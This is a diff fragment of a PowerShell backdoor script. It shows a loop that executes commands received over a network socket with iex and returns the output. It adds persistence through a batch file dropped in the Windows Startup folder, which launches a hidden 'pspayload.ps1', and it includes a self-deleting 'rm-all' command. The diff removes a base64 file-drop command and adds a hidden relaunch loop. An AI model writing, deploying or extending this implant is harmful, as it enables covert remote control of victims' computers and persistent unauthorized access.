@@ -20,25 +20,24 @@ while($true){
 			while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}
 			$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
 			$out_split = $out -split " ";
-			if(!$out.equals("exit") -and !$out.equals("r") -and !$out.equals("rm-all") -and !$out_split[0].equals("rec-file")){
+			if(!$out.equals("exit") -and !$out.equals("r") -and !$out.equals("rm-all")){
 				try{
 					$res = iex $out -ErrorAction Stop
-				} catch [System.Management.Automation.CommandNotFoundException]{} catch {throw}
-				if($res -ne $null){ $writer.Write($res -join "`r`n");$writer.Write("`r`n");}
+					$writer.Write($res -join "`r`n")
+				} catch {$writer.Write("error")}
+				$writer.Write("`r`n")
 			}
 			if($out.equals("rm-all")){
 				rm -Force "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\psrunner.bat"
 				rm -Force "~/pspayload.ps1"
-				$writer.close();
+				$writer.close()
 				$socket.close()
 				stop-process -Force -name powershell
-			}elseif($out_split[0].equals("rec-file") -and $out_split.length -eq 2){
-				$bytes = [Convert]::FromBase64String($out_split[1])
-				[IO.File]::WriteAllBytes("$ENV:UserProfile\received.out", $bytes)
 			}
 		} While (!$out.equals("exit"))
-		$writer.close();
-		$socket.close();
+		$writer.close()
+		$socket.close()
+		throw
 	}catch {
 		sleep -Seconds 10
 	}
@@ -51,6 +50,6 @@ $cmdstr= @"
 start "" "powershell" -windowstyle hidden "~\pspayload.ps1"
 "@
 $cmdstr | set-content "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\psrunner.bat" -Encoding Ascii
-(get-item "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\psrunner.bat").Attributes += 'Hidden'
-sleep -milliseconds 500
-cmd.exe /c "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\psrunner.bat"
+do{
+    cmd.exe /c 'start "" "powershell" -windowstyle hidden "~\pspayload.ps1"'
+}while((Get-Process powershell).length -le 2)
